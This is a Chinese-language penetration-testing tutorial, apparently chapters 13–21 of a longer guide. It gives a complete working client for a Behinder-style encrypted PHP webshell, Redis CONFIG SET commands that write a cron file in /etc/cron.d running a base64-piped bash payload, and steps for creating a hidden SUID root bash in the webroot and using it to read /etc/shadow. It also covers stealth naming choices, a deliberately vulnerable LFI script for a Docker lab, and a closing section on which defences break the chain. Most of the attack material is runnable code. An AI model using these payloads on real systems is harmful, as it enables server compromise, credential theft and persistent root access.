## 13.0 这一章要解决什么

**手上的资源**：三个 webshell URL + 密码。

**问题**：冰蝎马不是普通的一句话木马。它**只接受 AES 加密的 POST body**。你 `curl "?cmd=id"` 它什么都不干。

**要做的**：搞懂协议，然后写一个能用的客户端。

**为什么不用冰蝎 GUI**：需要桌面环境，且无法脚本化批量调用。协议本身很简单，21 行 Python 就够。

## 13.1 服务端（马里）的核心逻辑

```php
$key  = substr(md5($password), 0, 16);              // ① 密钥派生
$data = openssl_decrypt($_POST[...], "AES-128-CBC", $key, 0, str_repeat("\0",16));  // ② 解密
list($func, $code) = explode("|", $data, 2);        // ③ 拆分
eval($code);                                         // ④ 执行
```

**四步，每步都有讲究。**

## 13.2 ① 密钥为什么是 `md5(密码)[:16]`

AES-128 需要 **128 位 = 16 字节**的密钥。

而用户输入的密码是任意长度（比如 `Zk@Pe2695#kp7`，13 个字符）。怎么变成 16 字节？

**`md5()` 产生 32 个十六进制字符 = 32 字节的 ASCII 字符串。取前 16 个字符 = 16 字节。**

```bash
printf '%s' 'Zk@Pe2695#kp7' | md5sum | cut -c1-16
# e9a09b008f4bc760
```

> **注意：是取 md5 十六进制字符串的前 16 个字符，不是取 md5 原始字节的前 16 字节。** 这个区别很多人搞错。

## 13.3 ② IV 为什么是全零

AES-CBC 模式需要一个 16 字节的初始化向量（IV）。

正常做法是**每次随机生成 IV，然后随密文一起传给对方**。

冰蝎用的是**固定全零 IV**。这在实际密码学上是**不安全**的（相同明文会产生相同密文，可被分析），但对 webshell 场景够用 —— 因为它简化了协议：**客户端和服务端不需要协商 IV**。

```python
"-iv", "00" * 16    # 16 个 0x00 字节
```

## 13.4 ③ 为什么明文格式是 `功能名|代码`

```php
list($func, $code) = explode("|", $data, 2);
```

`explode("|", $data, 2)` 的意思是：**按 `|` 分割，最多分成 2 段**。

所以 `"x|echo 123;"` 变成 `["x", "echo 123;"]`。

- `$func` = `"x"` —— 功能标识（冰蝎有不同的功能：`x`=执行PHP、`f`=文件管理、`d`=数据库……）
- `$code` = `"echo 123;"` —— 实际代码

**为什么用 `|` 而不是别的分隔符：** `|` 在 PHP 代码里很少作为普通字符出现，冲突概率低。`limit=2` 保证即使代码里有 `|` 也不会被多切。

## 13.5 客户端为什么命令要 base64 两次

```python
inner = base64.b64encode(cmd.encode()).decode()          # 第一次
php   = "x|echo base64_encode(shell_exec(base64_decode('%s')));" % inner
#                                              ↑ 第二次（在PHP里）
```

### 第一次（Python 侧）：避免引号地狱

命令 `id; hostname; uname -a` 要放进 PHP 字符串：

```php
shell_exec('id; hostname; uname -a')      // 简单命令没问题
shell_exec('cat "/etc/my config.ini"')    // 有引号就麻烦
shell_exec('echo "it\'s ok"')             // 更麻烦
```

base64 后变成 `aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYQ==` —— **纯字母数字加 `=`**，放进单引号里绝对安全。

### 第二次（PHP 侧）：避免二进制回显破坏 HTTP

`shell_exec` 的输出可能是任意二进制：

```bash
cat /etc/shadow      # 文本，但可能有特殊字符
cat /bin/ls          # 纯二进制
head -c 1000 /dev/urandom   # 随机字节
```

如果直接 `echo` 出来，这些字节会进 HTTP 响应体。问题：

1. 可能包含 `\0`（null 字节），某些 HTTP 库会截断
2. 可能不是合法 UTF-8，Python 解码报错
3. 可能包含 `\r\n\r\n`，被 HTTP 解析器误认为是响应头结束

**base64 后是纯 ASCII，绝对安全传输。** 客户端收到再解码。

## 13.6 `openssl -A` 参数详解

```python
subprocess.run(["openssl", "enc", "-aes-128-cbc",
                "-K", key.hex(), "-iv", "00"*16, "-base64", "-A"], ...)
```

| 参数 | 含义 |
|---|---|
| `enc` | 加密模式 |
| `-aes-128-cbc` | 算法：AES，128 位密钥，CBC 模式 |
| `-K <hex>` | 密钥，**必须是十六进制字符串**（不是原文） |
| `-iv <hex>` | IV，同样十六进制 |
| `-base64` | 输出用 base64 编码（而不是原始二进制） |
| **`-A`** | **`-base64` 输出不换行** ★ |

### 不加 `-A` 会怎样

`openssl enc -base64` 默认每 64 个字符**插入一个换行符**：

```
U2FsdGVkX1+abc...xyz
def...uvw
ghi...rst
```

这些换行符会进 POST body。服务端 `openssl_decrypt` 收到含换行的 base64，**解码后字节数不对，AES 解密失败**（CBC 模式要求密文长度是 16 的倍数）。

结果：马返回空白或错误。

**`-A` = "single line"，输出一整行不换行。**

## 13.7 `.decode("latin-1")` 为什么

```python
body = urllib.request.urlopen(req, timeout=60).read().decode("latin-1")
```

`read()` 返回的是 `bytes`。要变成字符串才能 base64 解码。

- `.decode("utf-8")` —— 如果响应里有非 UTF-8 字节，**抛 UnicodeDecodeError**
- `.decode("latin-1")` —— **每个字节 0x00-0xFF 都能映射到一个字符，永不报错**

latin-1（ISO-8859-1）的特性：字节值直接对应 Unicode 码点 U+0000-U+00FF。**这是唯一能无损往返的编码。**

反正后面还要 `base64.b64decode()`，中间的字符串只是载体，用哪个编码不影响最终结果 —— 但 latin-1 不会崩。

## 13.8 wsh.py 完整源码

```python
#!/usr/bin/env python3
"""Drive a Behinder-template PHP shell (eval variant) over HTTP.

Usage: python3 wsh.py <shell_url> <pass> '<shell command>'

key = md5(pass)[:16]
body = AES-128-CBC( "x|echo base64_encode(shell_exec(base64_decode(b64(cmd))));" )
"""
import sys, subprocess, base64, hashlib, urllib.request, ssl

url = sys.argv[1]
pw  = sys.argv[2]
cmd = sys.argv[3]

# ① 密钥 = md5(密码) 的前 16 个十六进制字符
key = hashlib.md5(pw.encode()).hexdigest()[:16].encode()

# ② 命令先 base64（避免引号地狱）
inner = base64.b64encode(cmd.encode()).decode()

# ③ 构造 PHP 代码：执行命令，输出再 base64（避免二进制回显）
php = "x|echo base64_encode(shell_exec(base64_decode('%s')));" % inner

# ④ AES-128-CBC 加密，零 IV，-A 不换行
p = subprocess.run(
    ["openssl", "enc", "-aes-128-cbc",
     "-K", key.hex(), "-iv", "00" * 16, "-base64", "-A"],
    input=php.encode(), capture_output=True)
enc = p.stdout.strip()

# ⑤ POST 发送
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
req  = urllib.request.Request(url, data=enc, method="POST")
body = urllib.request.urlopen(req, timeout=60, context=ctx).read().decode("latin-1")

# ⑥ 解码输出
try:
    print(base64.b64decode(body.strip()).decode("utf-8", "replace"))
except Exception:
    print(body)
```

# 第 14 章 提权前必须懂的：UID 四元组与 SUID

## 14.0 这一章要解决什么

**手上的资源**：apache 权限的 webshell（`uid=48`）。

**要做的事**：提到 root。

**但在动手之前，必须搞懂两件事**，否则第 16、17 章的命令你会看不懂：

1. **为什么提权后 `id` 显示的还是 `apache`？** → 需要懂 UID 四元组
2. **SUID 是什么，为什么加个位就能提权？** → 需要懂文件权限的特殊位

**第 9.5 节已经讲过 UID 四元组，这里只补 SUID 部分，然后马上用。**

## 14.1 回顾：内核看的是 Effective UID

第 9.5 节讲过：

| 名字 | 含义 |
|---|---|
| Real UID | 谁启动了这个进程 |
| **Effective UID** | **内核检查权限时看这个** ★ |
| Saved Set UID | 临时提权后能恢复 |
| Filesystem UID | 读写文件时看这个 |

**平时这四个值都一样。但有两个例外会让它们不一样：**

1. **SUID 程序**（比如 `passwd`、`sudo`）：启动后 euid 变成文件属主
2. **`setuid()` 调用**：进程主动切换

**第 1 条就是提权的核心。**

## 14.2 Linux 文件权限的九个位

```
-rwsr-xr-x  1 root root  964536  /var/www/html/images/.bs
 ↑↑↑↑↑↑↑↑↑↑
 │││││││││
 │││││││└┴─ other（其他人）: r-x = 可读可执行
 │││││└┴─── group（同组）  : r-x = 可读可执行
 │└┴┴┴───── user（属主）   : rws = 可读可写可执行 + SUID ★
 └───────── 文件类型（- = 普通文件，d = 目录，l = 链接）
```

### 三位一组，数字换算

| 权限 | 字母 | 数字 |
|---|---|---|
| 读 | `r` | 4 |
| 写 | `w` | 2 |
| 执行 | `x` | 1 |

```
rwx = 4+2+1 = 7
r-x = 4+0+1 = 5
rw- = 4+2+0 = 6
r-- = 4+0+0 = 4
```

所以 `chmod 755` = `rwxr-xr-x`。

### ★ `chmod 4755` 那个 4 是什么

`chmod` 的数字其实是**四位**：

```
chmod 4755
      ↑↑↑↑
      │││└─ other: 5 (r-x)
      ││└── group: 5 (r-x)
      │└─── user : 7 (rwx)
      └──── 特殊位: 4 = SUID
```

### 三个特殊位

| 数字 | 名字 | 作用在 | 效果 | 字母显示 |
|---|---|---|---|---|
| **4** | **SUID** | 属主的 x 位 | 执行时 euid = 文件属主 | `s`（属主有 x）或 `S`（属主无 x） |
| 2 | SGID | 属组的 x 位 | 执行时 egid = 文件属组 | `s` 或 `S` |
| 1 | Sticky | other 的 x 位 | 只有属主能删（如 `/tmp`） | `t` 或 `T` |

## 14.3 ★ SUID 的关键语义

> **一个 SUID 程序，任何人执行它，进程的 euid 都会变成文件属主，而不是执行者。**

### 例子：`/usr/bin/passwd`

```bash
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 /usr/bin/passwd
#    ↑
#    s = SUID
```

普通用户执行 `passwd`，进程 euid 变成 root，所以它能改 `/etc/shadow`。

**但它内部有逻辑限制"只能改自己的密码"。**

### 如果这个程序是 bash

**bash 没有任何内置限制。加 SUID 位，属主 root，任何人执行就是 root shell。**

**这就是第 16 章的核心：把一个 bash 复制出来，加 SUID 位，属主是 root。**

## 14.4 所以提权路径是

```
apache 权限
   ↓ 借 Redis(root) 的手写文件
创建一个 root 属主的 SUID bash
   ↓
执行它，euid 变成 root
   ↓
root
```

**关键点：我们不需要"利用漏洞提权"（exploit a vulnerability），我们只需要"让 root 帮我们创建一个 root 的文件"。**

**而 Redis 就是那个愿意帮忙的 root 进程。**

**那具体怎么让 root 帮我们执行命令？** 下一章。

# 第 15 章 为什么 cron 能提权

## 15.0 这一章要解决什么

第 14.4 节说了要"创建 root 属主的 SUID bash"。

**但怎么创建？**

- 用 webshell（apache）创建 → 属主是 apache，不是 root
- 用 Redis 直接写 → 只能写文件内容，**不能设置文件属主和权限**

**所以需要找一个"以 root 身份执行命令"的机制。**

**cron 就是。**

## 15.1 cron 是什么

`cron` 是 Linux 的定时任务守护进程。

系统启动时 `crond` 以 **root 身份**常驻内存，**每分钟**检查一次配置文件，发现到点的任务就**用配置里指定的用户身份**执行。

## 15.2 ★ 关键点：两条线在这里交汇

> **crond 是 root 进程。它能执行任何用户的任何命令，因为它有 root 权限。**

**所以：如果我能往 cron 配置目录里写一个文件，写上"每分钟以 root 执行我的命令"，就等于拿到了 root 命令执行。**

**而 Redis 是 root，能往 `/etc/cron.d/` 写文件。** ← 第 9.5 节确认的

```
Redis 的写权限（第 9 章）
        +
cron 的 root 执行（本章）
        =
root 命令执行
```

**这就是整条链最后一块拼图。**

## 15.3 三个位置，格式不同（新手最大的坑）

### 位置 A：`/var/spool/cron/<用户名>`

```bash
# 文件路径: /var/spool/cron/root
# 内容格式（5 个时间字段 + 命令，没有用户字段）
* * * * * /bin/bash /tmp/x.sh
```

**用户由文件名决定。** 这个文件叫 `root`，所以以 root 执行。

### 位置 B：`/etc/cron.d/<任意名>`

```bash
# 文件路径: /etc/cron.d/zzroot
# 内容格式（5 个时间字段 + 用户 + 命令，必须有用户字段）
* * * * * root /bin/bash /tmp/x.sh
            ↑↑↑↑
            必须有！
```

**用户写在行里。** 文件名随便叫，但**不能带点**（`zzroot` ✅，`zzroot.sh` ❌）。

### 位置 C：`/etc/crontab`

```bash
# 内容格式（跟 B 一样，必须有用户字段）
* * * * * root /bin/bash /tmp/x.sh
```

**系统级 crontab，格式同 B。**

### 本案选哪个

**选位置 B（`/etc/cron.d/`）**，理由：

- 位置 A 需要文件名精确等于用户名（`root`），虽然 Redis 的 `dbfilename` 设成 `root` 也行，但 `/var/spool/cron` 目录在某些发行版权限更严
- 位置 C 是单文件，覆盖它会破坏系统原有任务
- **位置 B 是"放一个新文件进去"，最干净，执行完删掉即可**

## 15.4 时间字段的五个位置

```
* * * * * root command
│ │ │ │ │
│ │ │ │ └── 星期几 (0-7, 0和7都是周日)
│ │ │ └──── 月份   (1-12)
│ │ └────── 日     (1-31)
│ └──────── 小时   (0-23)
└────────── 分钟   (0-59)
```

`* * * * *` = **每分钟都执行**。

## 15.5 ★ cron 会忽略什么

`/etc/cron.d/` 下，crond **会跳过**：

1. **文件名含 `.`** 的文件（防止 `.bak`、`.swp` 被重复执行）
2. **group 或 other 可写**的文件（安全考虑，防止非 root 篡改）
3. **不是 0644 或 0600** 权限的文件

**所以我们的文件名必须是 `zzroot`（无点）。Redis 以 root 创建，默认 0644，正好合规。**

**这三条规则，第 16.7 节会逐个对应到具体操作。**

# 第 16 章 crontab 提权实操：四个细节

## 16.0 上一章留下了什么，这一章要解决什么

**手上的资源**：
- Redis(root) 能写任意文件
- 知道要写 `/etc/cron.d/zzroot`，格式是 `* * * * * root <命令>`
- 知道文件名不能带点、权限要 0644

**要做的**：把"创建 SUID bash"这个动作，变成一行 cron 规则写进去。

**这一章有四个细节，每个都能让整步静默失败。**

## 16.1 构造要执行的命令

```bash
SCRIPT='cp /bin/bash /var/www/html/images/.bs; chmod 4755 /var/www/html/images/.bs; id > /var/www/html/images/rootproof.txt'
```

### 三个动作，逐个解释

#### 动作 1：`cp /bin/bash /var/www/html/images/.bs`

**为什么复制 bash：** 因为要给 bash 加 SUID 位。但**不能直接给 `/bin/bash` 加 SUID** —— 那会把整个系统的 bash 变成 SUID，所有用户都能 root，立刻被运维发现，而且系统里所有脚本的行为都会变。

**为什么复制到 `/var/www/html/images/`：**

- webroot 里我们已经有写权限（apache 用户）
- `images/` 目录是"图片目录"，运维扫 webshell 通常先看 `*.php`，不看 `.bs`
- **`.bs` 以点开头** —— `ls` 默认不显示，`ls -la` 才看得到

**为什么叫 `.bs`：** 无意义的名字。如果叫 `bash_suid` 或 `rootbash`，`ls -la` 一眼就发现。

#### 动作 2：`chmod 4755 /var/www/html/images/.bs`

```
4 = SUID
7 = rwx (属主 root，可读可写可执行)
5 = r-x (同组，可读可执行)
5 = r-x (其他人，可读可执行)
```

结果：`-rwsr-xr-x 1 root root`

**那个 `s` 就是 SUID。** 任何人执行 `.bs`，进程 euid 变成 root。

> **注意**：这条命令是 **cron 以 root 身份执行的**，所以 `cp` 出来的文件属主是 root。**这就是为什么要绕 cron 这一圈** —— 如果 apache 自己 `cp`，属主就是 apache，SUID 位指向 apache，没用。

#### 动作 3：`id > /var/www/html/images/rootproof.txt`

**为什么留证据：** 证明提权成功。`id` 输出 `uid=0(root) gid=0(root)`。

**为什么要落文件而不是直接回显：** 因为 cron 执行时没有终端，输出会丢失。落成文件，之后用 webshell 读。

## 16.2 为什么 payload 要 base64

```bash
B64S=$(printf '%s' "$SCRIPT" | base64 -w0)
```

`base64 -w0`：`-w0` = 不换行（width 0）。

### 不 base64 会怎样

cron 行的格式是：

```
* * * * * root <命令>
```

cron 对命令的解析规则很粗糙：**它按空格分词，但不用完整的 shell 解析器**。具体来说：

- `%` 在 cron 里有特殊含义（表示换行，会被转成 stdin）
- `;` 在某些 cron 实现里会被误解析
- 引号处理跟 shell 不一致

我们的 SCRIPT 里有 `;`（三个命令串联）和 `>`（重定向）。**直接放进去，cron 大概率解析错。**

### base64 之后

```bash
printf '\n* * * * * root echo %s | base64 -d | bash\n' "$B64S"
```

生成的 cron 行：

```
* * * * * root echo Y3AgL2Jpbi9iYXNoIC92YXIv... | base64 -d | bash
```

**纯字母数字 + `|` + `-`，cron 能正确解析。**

**运行时**：`echo` 输出 base64 → `base64 -d` 解码 → `bash` 执行原始脚本。

**这个技巧叫 "base64 pipe to bash"，是绕过各种命令解析限制的通用手段。**

## 16.3 写入 Redis

```bash
$REDIS CONFIG SET rdbcompression no
$REDIS CONFIG SET dir /etc/cron.d
$REDIS CONFIG SET dbfilename zzroot
$REDIS -x SET rkey < /tmp/rootcron.txt
$REDIS SAVE
```

### 逐条解释

#### ① `CONFIG SET rdbcompression no`

**再关一次。** 因为第 12 章写完之后我们恢复了配置（`CONFIG SET rdbcompression yes`）。现在要再写，必须再关。

> **这是一个容易漏的点**：写文件前必须确认 `rdbcompression` 是 `no`。每次写都要确认。

#### ② `CONFIG SET dir /etc/cron.d`

把 RDB 工作目录改成 cron 配置目录。

**为什么能写这里：** Redis 进程是 root（第 9.4 节确认的 `Uid: 0 0 0 0`）。**root 能写任何目录。**

如果 Redis 是普通用户（比如 `redis` 用户），这一步会失败：

```
(error) ERR Changing directory: Permission denied
```

#### ③ `CONFIG SET dbfilename zzroot`

文件名 `zzroot`。

**为什么不能叫 `zzroot.sh` 或 `zzroot.conf`：** 对应第 15.5 节的规则 1 —— crond 扫描 `/etc/cron.d/` 时**跳过含 `.` 的文件名**。

所以：
- `zzroot` ✅ 会执行
- `zzroot.sh` ❌ 被忽略
- `zzroot.conf` ❌ 被忽略

#### ④ `-x SET rkey < /tmp/rootcron.txt`

把 cron 文件内容作为 RDB 里的一个 value 存进去。

key 名叫 `rkey`（随便叫，不影响结果）。

**`-x` 的作用见第 12.4 节** —— 从 stdin 读原始字节，不经过 shell 展开。

#### ⑤ `SAVE`

触发落盘。此刻 `/etc/cron.d/zzroot` 被创建，内容是：

```
REDIS0009<二进制>...\n* * * * * root echo <b64> | base64 -d | bash\n
```

**注意那个 `\n`** —— 下一节讲它为什么是救命的。

## 16.4 恢复配置

```bash
$REDIS CONFIG SET dir /
$REDIS CONFIG SET dbfilename dump.rdb
$REDIS CONFIG SET rdbcompression yes
```

**为什么必须恢复（比第 11.7 节更重要的原因）：**

如果不恢复 `dir`，Redis 下次自动 BGSAVE 会写进 `/etc/cron.d/dump.rdb` —— **一个文件名带点的文件**，虽然会被 cron 忽略，但会污染目录，而且可能覆盖你刚写的 `zzroot`。

## 16.5 ★ 细节一：`printf` 开头那个 `\n` 是救命的

**这是本节最重要的内容。**

### RDB 二进制头对 cron 是致命的

第 11.6 节说过：RDB 文件开头是一串二进制（`REDIS0009` + 元数据），**里面没有换行符**。

而 cron 的解析规则是：

> **cron 按行解析。每一行要么是完整合法的 cron 规则，要么整行被丢弃。**

**所以如果你直接写：**

```
REDIS0009<二进制>...* * * * * root echo xxx | bash
```

**cron 看到的是"一整行超长的、开头是乱码的、格式错误的内容" → 整行丢弃 → 提权静默失败。**

### 失败是什么样子

**没有任何报错。** `/var/log/cron` 里可能只有一句 `bad minute`，或者什么都没有。

**你就坐在那里等，等到怀疑人生。**

### 解决办法：加一个前导换行

```bash
printf '\n* * * * * root echo %s | base64 -d | bash\n' "$B64S" > /tmp/rootcron.txt
```

`printf` 开头的 `\n`，把文件切成两行：

```
行1: REDIS0009<二进制>...        ← 垃圾，cron 忽略（格式错误）
行2: * * * * * root echo ... | bash   ← 合法，cron 执行 ★
```

**这一个字节的 `\n`，是 crontab 提权的生死线。**

### 顺带解释 `printf` vs `echo`

| 命令 | 是否解析 `\n` | 说明 |
|---|---|---|
| `echo '\n...'` | ❌（在某些 shell 里） | 会原样输出 `\n` 两个字符 |
| `printf '\n...'` | ✅ | POSIX 标准，**一定解析转义序列** |

**所以构造含特殊字符的 payload，一律用 `printf`。**

## 16.6 ★ 细节二：`/etc/cron.d/` 的文件必须有用户字段

对应第 15.3 节的格式表。

我们写的是 `/etc/cron.d/zzroot`（位置 B），所以行里必须有 `root`：

```
* * * * * root echo <b64> | base64 -d | bash
            ↑↑↑↑
```

**漏了 `root`，crond 报 `bad minute` 或直接跳过，等一分钟什么都不会发生。**

> **对比**：如果写的是 `/var/spool/cron/root`（位置 A），**不能**有 `root` 字段：
>
> ```
> * * * * * echo <b64> | base64 -d | bash     ← 位置 A，无用户字段
> ```
>
> **搞混这两个格式，是最常见的失败原因。**

## 16.7 ★ 细节三：文件名不能带点，权限必须 0644

对应第 15.5 节。

| 要求 | 本案怎么满足的 |
|---|---|
| 文件名不含 `.` | `dbfilename zzroot`（无点） |
| 权限 0644 | Redis 以 root 创建文件，默认 `umask 022` → 0644 |
| 属主是 root | Redis 以 root 运行 → 文件属主 root |

**三条全部自动满足。** 这也是为什么"用 Redis 写"比"用 webshell 写"更合适 —— webshell 是 apache 用户，写出来的文件属主是 apache，cron 会拒绝（因为非 root 属主 + 可能 group 可写）。

## 16.8 ★ 细节四：等待时间

```bash
sleep 70
```

**为什么是 70 秒：**

1. cron 最小粒度 = 1 分钟
2. crond 在**每分钟的第 0 秒**扫描目录
3. 你写入的时刻是随机的（比如 12:34:23）
4. 下一次扫描是 12:35:00（37 秒后）
5. 但如果你在 12:34:59 写入，crond 可能已经扫完了（1 秒后就是 12:35:00，可能刚好错过）

**所以最坏情况要等 60 秒 + 扫描延迟。70 秒是安全余量。**

**等 30 秒会怎样：** 大概率什么都没发生。你会以为失败了，然后重复写入，最后 `/etc/cron.d/` 里有一堆 `zzroot`、`zzroot2`、`zzroot3`，反而乱。

### 更精确的等待方式

```bash
sleep $(( 60 - $(date +%S) + 5 ))
```

- `$(date +%S)` 取当前秒数（0-59）
- `60 - 当前秒 + 5` = 等到下一个整分钟后再等 5 秒

**比 `sleep 70` 更快更准。**

### 逐字段解释

- `gid=48(apache)` —— 真实 GID
- **`euid=0(root)`** —— 有效 UID 是 root，**这就是提权成功的标志**

**为什么 `uid` 还是 48 但能读 shadow：** 第 14.1 节讲过 —— 内核检查文件权限看的是 **euid**，不是 uid。euid=0 就有 root 权限。

**一个 root 属主的 SUID bash：**

```
/var/www/html/images/.bs    -rwsr-xr-x 1 root root
```

# 第 17 章 SUID bash 的 -p 参数

## 17.0 这一章要解决什么

**手上的资源**：SUID bash（`/var/www/html/images/.bs`，属主 root，有 s 位）。

**看起来已经成功了。但直接用会失败。**

**这一章讲为什么，以及怎么绕。**

## 17.1 命令

```bash
/var/www/html/images/.bs -p -c "id"
#                        ↑
#                        这个 -p 不能少
```

## 17.2 不加 `-p` 会发生什么

```bash
/var/www/html/images/.bs -c "id"
# → uid=48(apache) gid=48(apache)
```

**看起来提权失败了。** 但其实是 bash **主动把权限丢了**。

## 17.3 为什么 bash 要主动降权

这是 bash 的安全设计，写在 bash 源码里（`shell.c` 的 `disable_priv_mode()` 函数）。

逻辑是：

```c
if (running_setuid && privileged_mode == 0) {
    // 检测到 euid != uid 且没有 -p
    // 主动把 euid 降回 uid
    setuid(getuid());
}
```

### 为什么这么设计

假设有一个 SUID root 的程序，它内部调用 `system("ls")`。如果 bash 保持 euid=root，那么 `ls` 就有 root 权限 —— 这可能不是程序作者的意图。

所以 bash 采取保守策略：**我不是被专门设计成 SUID 程序的，那我就把权限丢掉。**

## 17.4 `-p` 的作用

`-p`（privileged mode）告诉 bash：**"我知道我在 SUID 环境里，别降权，保持 euid。"**

```bash
/var/www/html/images/.bs -p -c "id"
# → uid=48(apache) gid=48(apache) euid=0(root)  ✅
```

## 17.5 这个坑有多常见

**极其常见。** 几乎每个学 SUID 提权的人都会踩：

```bash
find / -perm -4000 -type f 2>/dev/null    # 找到 SUID 文件
./suspicious_binary -c "id"                # 测试
# → uid=1000(user) ...  以为不是提权点
```

**实际上可能是个 SUID bash 的副本，只是没加 `-p`。**

## 17.6 验证方法

```bash
# 方法 1：看权限位
ls -la /var/www/html/images/.bs
# -rwsr-xr-x 1 root root    ← s 就是 SUID

# 方法 2：直接测 euid
/var/www/html/images/.bs -p -c "id"
# uid=48(apache) ... euid=0(root)   ← euid 是 root，成功

# 方法 3：读只有 root 能读的文件
/var/www/html/images/.bs -p -c "cat /etc/shadow | head -1"
# root:$6$...    ← 能读出来，说明真的是 root
```

## 17.7 其他 shell 也有类似行为

| Shell | 不加 `-p` 是否降权 |
|---|---|
| `bash` | ✅ 降权 |
| `dash`（Ubuntu 的 `/bin/sh`） | ✅ 降权 |
| `zsh` | 视配置而定 |
| `busybox sh` | ❌ 通常不降权（实现简单） |

**所以：SUID shell 测试，第一件事是加 `-p`。**

```

  → 读 redis.conf（拿密码）            第 8 章

```

# 第 19 章 故障排查决策树

## 19.1 卡点 1：`CONFIG SET` 报错

### 现象 A

```
(error) ERR unknown command 'CONFIG'
```

**原因**：`rename-command CONFIG ""` 被配了（第 8.7 节说的那个判断点）。

**这条路断了。** 换思路：

- 主从复制 RCE（需要 Redis 4.x+，且能连外网）
- Lua 沙箱逃逸（需要 EVAL 可用）
- 或者放弃 Redis，找别的入口

### 现象 B

```
(error) ERR Changing directory: Permission denied
```

**原因**：Redis 不是 root（第 9.5 节那个 `Uid` 不是 `0 0 0 0`）。

**不能写 `/etc/cron.d`。** 只能写 Redis 有权限的目录（通常是 `/var/lib/redis/`、`/tmp/`）。

**改思路**：
1. 写 `/tmp/` 然后找文件包含点（LFI 已经确认存在）
2. 找 Redis 用户能写的 webroot 子目录
3. 如果 webroot 完全不可写，考虑写 `/var/spool/cron/redis`（如果 redis 用户有 crontab 权限）

**看两件事：**


```
/etc/cron.d/ 下必须: * * * * * root <cmd>
少了 root，crond 报 bad minute（第 16.6 节）
```

**注意：本案 `ps` 被替换了，不可信！**（见第 21.6 节）

```bash
ls -la /proc/*/exe 2>/dev/null | grep crond
```

```bash
tail -50 /var/log/cron                    # CentOS/RHEL
tail -50 /var/log/syslog | grep CRON      # Debian/Ubuntu
```

```bash
# 看 euid 字段
```

# 第 20 章 本地靶场复现

**必须自己动手练一遍，光看没用。**

## 20.1 环境搭建（方法 A：两个容器 + 共享卷）

```bash
# 1) 准备 webroot
mkdir -p /tmp/webroot

# 2) Redis 3.2（老版本，RDB 行为完整），同时挂载 webroot
docker run -d --name redis-lab --privileged \
  -p 6379:6379 \
  -v /tmp/webroot:/var/www/html \
  redis:3.2 \
  redis-server --requirepass 'test123' --protected-mode no --dir /var/www/html

# 3) PHP + Apache
docker run -d --name php-lab \
  -p 9090:80 \
  -v /tmp/webroot:/var/www/html \
  php:7.4-apache

# 4) 写一个 LFI 的 down.php
cat > /tmp/webroot/down.php <<'EOF'
<?php
$url = $_GET['url'];
header('Content-Disposition: attachment;filename="'.$_GET['name'].'.'.$_GET['extension'].'"');
echo file_get_contents($url);
EOF
```

### 关键点解释

**为什么 Redis 要挂载 `/tmp/webroot`：**

Docker 里 Redis 和 PHP 是**两个独立容器**，文件系统不共享。如果 Redis 写 `/var/www/html/x.php`，写的是**Redis 容器自己**的 `/var/www/html`，PHP 容器看不到。

挂载同一个宿主机目录到两个容器的 `/var/www/html`，就能共享。

**为什么用 `redis:3.2`：**

新版 Redis（7.x）的 RDB 格式有变化，且 `CONFIG SET dir` 的行为在某些版本受限。3.2 是经典版本，行为最"标准"。

## 20.2 环境搭建（方法 B：单容器跑两个服务）

更接近真实场景：

```bash

  -p 6379:6379 -p 9090:80 \

    sed -i 's/^bind 127.0.0.1/bind 0.0.0.0/' /etc/redis/redis.conf && \
    sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf && \
    echo 'requirepass test123' >> /etc/redis/redis.conf && \
    service redis-server start && \
    apache2ctl -D FOREGROUND
  "
```

## 21.6 为什么 `ps` 被替换这么严重

所有基于 `ps` 的进程统计**全部不可信**。

当时有个观察是"sshd 进程从 4 增到 49"，后来判定这个结论作废 —— 因为 `ps` 根本不返回数据，那个数字来源不明。

### 可信的替代方案：`/proc` 直读

Linux 的 `/proc` 是内核直接暴露的，**木马改不了**（除非改内核）。

思路：

1. 读 `/proc/net/tcp`，找 `st == 0A` 的行（`0A` = LISTEN 状态）
2. 每行第 10 列是 **socket inode**
3. 遍历 `/proc/*/fd/*`，`readlink` 每个 fd，找 `socket:[<inode>]` 的匹配
4. 匹配到就拿到了 PID
5. 读 `/proc/<pid>/exe`（二进制路径）和 `/proc/<pid>/cmdline`（启动参数）

### 核心代码

```python
import os, glob

# 1) 拿所有 LISTEN 的 socket inode → 端口
inodes = {}   # inode -> port
for line in open('/proc/net/tcp'):
    f = line.split()
    if len(f) > 9 and f[3] == '0A':     # 0A = LISTEN
        port = int(f[1].split(':')[1], 16)
        inodes[f[9]] = port             # f[9] = inode

# 2) 遍历所有进程的 fd，反查 inode → pid
for fd in glob.glob('/proc/[0-9]*/fd/*'):
    try:
        tgt = os.readlink(fd)           # 形如 "socket:[123456]"
        if tgt.startswith('socket:['):
            ino = tgt[8:-1]
            if ino in inodes:
                pid = fd.split('/')[2]
                exe = os.readlink(f'/proc/{pid}/exe')
                cmd = open(f'/proc/{pid}/cmdline').read().replace('\0', ' ')
                print(inodes[ino], pid, exe, cmd)
    except (OSError, PermissionError):
        pass
```

# 收口：三个核心知识点

如果只记三件事：

## 1. `rdbcompression no` —— Redis 写文件的生命线

不关它，LZF 会压坏 payload。**报错完全不指向真正原因**，你会去查权限、路径、WAF，浪费几小时。

## 2. crontab 的 `\n` + 用户字段 —— 两个都不能少

- `\n`：把 RDB 二进制头和 cron 行切开，否则整行被丢弃
- `root`：`/etc/cron.d/` 下必须有用户字段

**少任何一个，提权静默失败，没有任何报错。**

## 3. SUID bash 的 `-p` —— 不加就白干

bash 检测到 `euid != uid` 会主动降权。`-p` 告诉它别降。

**这是"看起来成功实际没成功"的头号原因。**

## 这条链的四个"独立小问题"

回到最开始说的：这条链之所以能走通，不是因为某一个漏洞有多严重，而是因为**四个不致命的小问题串成了一条路**。

| # | 小问题 | 单独看有多严重 | 见章节 |
|---|---|---|---|
| ① | 一个下载接口没校验参数 | 只能读文件，不能执行代码 | 7 |
| ② | 一个配置文件存了明文密码 | 只是个配置疏忽 | 8 |
| ③ | Redis 用 root 跑且没禁 CONFIG | 只是加固没做到位 | 9-10 |
| ④ | `/etc/cron.d` 会以 root 执行 | 这是正常功能，不是漏洞 | 15 |

**①+②+③+④ = root。**

任何一个环节补上，整条链就断了。这就是为什么**防御要看链，不是看单点**：

- Redis 不以 root 跑 → ③ 断，整链断
- `down.php` 参数白名单 → ① 断，整链断
- 配置文件不存明文 → ② 断，整链断
- `rename-command CONFIG ""` → ③ 断，整链断

